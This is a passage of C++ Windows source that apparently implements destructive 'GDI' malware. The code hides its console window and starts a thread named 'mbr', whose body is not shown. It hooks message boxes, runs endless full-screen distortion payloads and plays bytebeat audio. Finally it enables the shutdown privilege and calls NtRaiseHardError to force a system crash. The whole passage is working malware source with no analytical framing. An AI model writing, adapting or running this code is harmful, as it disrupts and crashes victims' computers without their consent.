        EnumChildWindows(hwndMsgBox, MsgBoxRefreshWndProc, 0);
        RedrawWindow(hwndMsgBox, NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW);

        Sleep(16);

        EnumChildWindows(hwndMsgBox, MsgBoxRefreshWndProc, 0);
        Sleep(16);
    }
}


LRESULT CALLBACK MagmaBoxHookProc(INT nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HCBT_ACTIVATE)
    {
        HWND hwndMsgBox = (HWND)wParam;
        ShowWindow(hwndMsgBox, SW_SHOW);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MagmaBoxThread, hwndMsgBox, 0, NULL);
        return 0;
    }

    return CallNextHookEx(hMsgHook, nCode, wParam, lParam);
}

VOID MagmaBoxW(HWND parent, LPCWSTR text, LPCWSTR title, UINT type)
{
    hMsgHook = SetWindowsHookExW(WH_CBT, MagmaBoxHookProc, NULL, GetCurrentThreadId());
    MessageBoxW(parent, text, title, type);
    UnhookWindowsHookEx(hMsgHook);
}



int g_buf = 0;
WCHAR g_str[32];

void GenerateRandomString()
{
    int len = 5 + (rand() % 10);
    for (int i = 0; i < len; i++)
        g_str[i] = L'A' + (rand() % 26);
    g_str[len] = 0;
}

DWORD WINAPI messWchar(LPVOID lp)
{
    for (;;)
    {
        g_buf++;
        GenerateRandomString();
        Sleep(1);
    }
    return 0;
}

BOOL CALLBACK EnumMsgBoxProc(HWND hwnd, LPARAM lp)
{
    WCHAR cls[32];
    GetClassNameW(hwnd, cls, 32);

    if (lstrcmpW(cls, L"#32770") == 0)
    {
        SetWindowTextW(hwnd, g_str);

        HWND hStatic = FindWindowExW(hwnd, NULL, L"Static", NULL);
        if (hStatic)
            SetWindowTextW(hStatic, g_str);
    }

    return TRUE;
}

DWORD WINAPI MessageBoxmono(LPVOID lp)
{

    MagmaBoxW(NULL, L"                                                                                                                                                                                                                         ", L"                                                                                                                                                                                                                                                   ", MB_OK | MB_ICONERROR | MB_RTLREADING | MB_RIGHT);
    EnableWindow(NULL, TRUE);

    return 0;
}

DWORD WINAPI blr(LPVOID lpParam) {
    HDC hdc;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), size = 199;
    while (1) {
        hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCERASE);
        for (int i = 0; i < 25; i++) {
            int x = -size + rand() % (sw + size), y = -size + rand() % (sh + size);
            BitBlt(hdcMem, x, y, size, size, hdcMem, x + rand() % 18 + 8, y + rand() % 18 + 8, 0x3200000);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
        ReleaseDC(0, hdc);

        DeleteObject(screenshot); DeleteDC(hdcMem); DeleteDC(hdc);
    }
}

DWORD WINAPI payload1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt(x * y));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI payload2(LPVOID lpParam) {
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);

        POINT vertices[] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
        GradientFill(hdc, NULL, 0, NULL, 0, GRADIENT_FILL_RECT_H);
        GradientFill(hdc, NULL, 0, NULL, 0, GRADIENT_FILL_RECT_V);
        GradientFill(hdc, NULL, 0, NULL, 0, GRADIENT_FILL_TRIANGLE);

        TRIVERTEX vertex[6];
        for (int i = 0; i < 6; ++i) {
            vertex[i].x = vertices[i].x;
            vertex[i].y = vertices[i].y;
            vertex[i].Red = 25 << 8;
            vertex[i].Green = 16 << 8;
            vertex[i].Blue = 255 << 8;
            vertex[i].Alpha = 105 << 8;
            vertex[0].Red = 0xff00;
            vertex[0].Green = 0x8000;
            vertex[0].Blue = 0x6000;
            vertex[0].Alpha = 0x3000;
            vertex[1].Red = 0x5000;
            vertex[1].Green = 0x9000;
            vertex[1].Blue = 0x6000;
            vertex[1].Alpha = 0x2000;
        }
        GRADIENT_TRIANGLE gradientTri = { 0, 1, 2 };

        POINT gradientVertices[] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
        POINT poly[3] = { vertices[0], vertices[1], vertices[2] };

        GradientFill(hdc, vertex, 7, &gradientTri, 1, GRADIENT_FILL_TRIANGLE);
        DeleteObject(vertex);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i ^ 4) * sin(x ^ y));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCAND);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = x + (int)(sin(0.005 * y + t * 0.005) * 200);
                int srcY = y + (int)(sin(0.005 * x + t * 0.005) * 200);

                if (srcX < 0) srcX += w;
                if (srcX >= w) srcX -= w;
                if (srcY < 0) srcY += h;
                if (srcY >= h) srcY -= h;

                pixel[y * w + x] = pixel[srcY * w + srcX];
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload5(LPVOID lpParam) {

    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 22;
    DOUBLE angle = 22.f;
    DWORD startTime = GetTickCount();

    while (true)

    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 2; x < w; x++)
        {
            for (int y = 2; y < h; y++)
            {
                int index = y * w + x;

                int cx = (x - (w * 7));
                int cy = (y - (h * 7));

                int zx = tan(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + tan(angle) * cy;

                int fx = (zx | ((x >> 3) * zy)) / 320;

                rgbquad[index].rgbRed ^= fx;
                rgbquad[index].rgbGreen ^= fx + 32;
                rgbquad[index].rgbBlue ^= fx + 32;
            }
        }

        i++;
        angle += 2122.f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCERASE);

        BitBlt(hdc, 2, 0, w, h, hdc, 0, 0, SRCAND);
        BitBlt(hdc, -2, 0, w, h, hdc, 0, 0, SRCCOPY);

        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(0);
    }
    return 0;
}

void sound1(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((t >> 11) % 913 ^ (t >> 1) % 212) * t >> 11
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound2(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((t >> 11) % 93 * (t >> 1) % 212) * t >> 111
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound3(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t + (t + t ^ t >> 9) + t * (t >> 9 * (t * 16 ? 2 : 6) & t >> 19)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound4(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t + (t + t | t >> 9) + t * (t >> 9 * (t * 16 ? 2 : 6) & t >> 32)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound5(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * rand()
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

DWORD WINAPI payloadRander(LPVOID lpParam) {
    while (true)
    {
        HANDLE thread1 = CreateThread(0, 0, blr, 0, 0, 0);
        HANDLE thread2 = CreateThread(0, 0, payload1, 0, 0, 0);
        HANDLE thread3 = CreateThread(0, 0, payload2, 0, 0, 0);
        Sleep(3200);
        TerminateThread(thread1, 0);
        CloseHandle(thread1);
        TerminateThread(thread2, 0);
        CloseHandle(thread2);
        TerminateThread(thread3, 0);
        CloseHandle(thread3);
        HANDLE thread4 = CreateThread(0, 0, payload3, 0, 0, 0);
        Sleep(3200);
        TerminateThread(thread4, 0);
        CloseHandle(thread4);
        HANDLE thread5 = CreateThread(0, 0, payload4, 0, 0, 0);
        Sleep(7500);
        TerminateThread(thread5, 0);
        CloseHandle(thread5);
        HANDLE thread6 = CreateThread(0, 0, payload5, 0, 0, 0);
        Sleep(5000);
        TerminateThread(thread6, 0);
        CloseHandle(thread6);
    }
}

LRESULT CALLBACK WndProc3(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == WM_KEYDOWN && w == VK_ESCAPE) DestroyWindow(h);
    if (m == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(h, m, w, l);
}

void DrawEllipseAt(HDC hdc, int x, int y, int color) {
    HBRUSH hBrush = CreateSolidBrush(color);
    SelectObject(hdc, hBrush);
    Ellipse(hdc, x - 10, y - 10, x + 20, y + 20);
    DeleteObject(hBrush);
}

int main()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    CreateThread(0, 0, mbr, 0, 0, 0);
    CreateThread(0, 0, MessageBoxmono, 0, 0, 0);
    CreateThread(0, 0, payloadRander, 0, 0, 0);
    sound1(11025, 30);
    sound3(8000, 30);
    sound4(11025, 30);
    sound5(8000, 30);
    Sleep(100);
    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
    Sleep(-1);
}